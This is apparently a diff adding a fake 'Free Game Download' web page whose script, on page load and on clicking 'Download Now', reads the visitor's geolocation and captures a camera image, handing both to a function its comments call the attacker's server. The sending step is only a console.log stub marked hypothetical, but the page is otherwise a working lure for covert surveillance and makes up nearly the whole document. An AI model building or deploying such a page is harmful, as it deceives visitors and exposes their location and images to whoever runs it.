@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Game Download!</title>
+    <script>
+        // Function to get the user's location
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        alert(`Your location: Latitude ${latitude}, Longitude ${longitude}`);
+                        // Send location to attacker's server (hypothetical)
+                        sendToServer(`Location: Latitude ${latitude}, Longitude ${longitude}`);
+                    },
+                    (error) => {
+                        alert(`Error getting location: ${error.message}`);
+                    }
+                );
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Function to capture images from the camera
+        function captureImages() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Capture front camera image
+                    setTimeout(() => {
+                        const canvasFront = document.createElement('canvas');
+                        canvasFront.width = video.videoWidth;
+                        canvasFront.height = video.videoHeight;
+                        const contextFront = canvasFront.getContext('2d');
+                        contextFront.drawImage(video, 0, 0, canvasFront.width, canvasFront.height);
+                        const frontImage = canvasFront.toDataURL('image/png');
+                        alert("Front camera image captured!");
+                        sendToServer(`Front Camera Image: ${frontImage}`);
+                    }, 1000);
+
+                    // Hypothetical: Switch to rear camera (not directly supported in most browsers)
+                    // This is a simplified example and may not work in real-world scenarios.
+                })
+                .catch((error) => {
+                    alert(`Error accessing camera: ${error.message}`);
+                });
+        }
+
+        // Function to send data to attacker's server (hypothetical)
+        function sendToServer(data) {
+            // Hypothetical: Send data to attacker's server
+            console.log(`Data sent to server: ${data}`);
+        }
+
+        // Execute the attack when the page loads
+        window.onload = () => {
+            getLocation();
+            captureImages();
+        };
+    </script>
+</head>
+<body>
+    <h1>Download the Latest Game for Free!</h1>
+    <p>Click below to start the download:</p>
+    <a href="#" onclick="getLocation(); captureImages();">Download Now</a>
+</body>
+</html>
